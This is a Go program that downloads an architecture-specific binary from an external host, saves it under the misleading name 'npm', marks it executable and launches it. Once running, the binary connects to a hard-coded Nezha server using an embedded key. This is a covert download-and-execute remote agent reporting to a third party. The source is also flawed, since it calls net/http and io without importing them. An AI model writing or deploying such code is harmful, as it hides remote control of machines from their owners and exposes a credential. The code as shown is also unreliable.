package main

import (
	"fmt"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
)

// 环境变量配置
type Config struct {
	FilePath    string
	NezhaServer string
	NezhaPort   string
	NezhaKey    string
}

func loadConfig() *Config {
	return &Config{
		FilePath:    getEnv("FILE_PATH", "./tmp"),
		NezhaServer: getEnv("NEZHA_SERVER", "nezha.mingfei1981.eu.org"),
		NezhaPort:   getEnv("NEZHA_PORT", "443"),
		NezhaKey:    getEnv("NEZHA_KEY", "l5GINS8lct8Egroitn"),
	}
}

func getEnv(key, defaultValue string) string {
	if value, exists := os.LookupEnv(key); exists {
		return value
	}
	return defaultValue
}

func downloadFile(filePath string, url string) error {
	resp, err := http.Get(url)
	if err != nil {
		return fmt.Errorf("Download failed: %v", err)
	}
	defer resp.Body.Close()

	out, err := os.Create(filePath)
	if err != nil {
		return fmt.Errorf("Failed to create file: %v", err)
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	if err != nil {
		return fmt.Errorf("Failed to write file: %v", err)
	}

	return nil
}

func getSystemArchitecture() string {
	arch := runtime.GOARCH
	if arch == "arm" || arch == "arm64" || arch == "aarch64" {
		return "arm"
	}
	return "amd"
}

func startNezha(cfg *Config) {
	// 创建目录
	if err := os.MkdirAll(cfg.FilePath, 0775); err != nil {
		log.Printf("Failed to create directory: %v", err)
		return
	}

	// 确定架构并下载 npm
	arch := getSystemArchitecture()
	npmUrl := "https://amd64.ssss.nyc.mn/agent"
	if arch == "arm" {
		npmUrl = "https://arm64.ssss.nyc.mn/agent"
	}

	// 下载 npm
	npmPath := filepath.Join(cfg.FilePath, "npm")
	if err := downloadFile(npmPath, npmUrl); err != nil {
		log.Printf("Failed to download npm: %v", err)
		return
	}
	log.Printf("Successfully downloaded npm")

	// 设置权限
	if err := os.Chmod(npmPath, 0755); err != nil {
		log.Printf("Failed to set permissions for npm: %v", err)
	}

	// 检查 Nezha 配置并运行
	if cfg.NezhaServer != "" && cfg.NezhaKey != "" && cfg.NezhaPort != "" {
		nezhaArgs := []string{
			"-s", fmt.Sprintf("%s:%s", cfg.NezhaServer, cfg.NezhaPort),
			"-p", cfg.NezhaKey,
		}
		
		// 检查是否需要 TLS
		tlsPorts := []string{"443", "8443", "2096", "2087", "2083", "2053"}
		for _, port := range tlsPorts {
			if cfg.NezhaPort == port {
				nezhaArgs = append(nezhaArgs, "--tls")
				break
			}
		}

		// 启动 npm
		cmd := exec.Command(npmPath, nezhaArgs...)
		if err := cmd.Start(); err != nil {
			log.Printf("Failed to start npm: %v", err)
		} else {
			log.Println("npm is running")
		}
	} else {
		log.Println("NEZHA configuration incomplete, skipping running")
	}
}

func main() {
	cfg := loadConfig()
	startNezha(cfg)
	
	// 保持程序运行
	select {}
}
